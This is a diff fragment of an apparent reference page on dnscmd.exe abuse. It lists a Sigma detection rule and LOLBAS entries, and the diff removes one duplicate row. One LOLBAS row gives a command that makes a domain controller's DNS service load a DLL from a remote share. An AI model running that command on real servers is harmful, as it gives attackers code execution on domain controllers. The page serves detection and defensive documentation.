@@ -60,7 +60,6 @@ SSDEEP | `6144:o5FNqlwAxdeYEsan7TRPrES2LN8s9xi0DCtT1TRep2A+wXz3o:o5FNCreYEscTRPA
 Source | Source File | Example | License
 -- | -- | -- | --
 [sigma](https://github.com/Neo23x0/sigma) | [sysmon_dns_serverlevelplugindll.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/registry_event/sysmon_dns_serverlevelplugindll.yml) | `        CommandLine: 'dnscmd.exe /config /serverlevelplugindll *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
-[sigma](https://github.com/Neo23x0/sigma) | [sysmon_dns_serverlevelplugindll.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/sysmon/sysmon_dns_serverlevelplugindll.yml) | `        CommandLine: 'dnscmd.exe /config /serverlevelplugindll *'` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `Name: Dnscmd.exe` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `  - Command: dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\192.168.0.149\dll\wtf.dll` | 
 [LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Dnscmd.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Dnscmd.yml) | `  - Path: C:\Windows\System32\Dnscmd.exe` | 
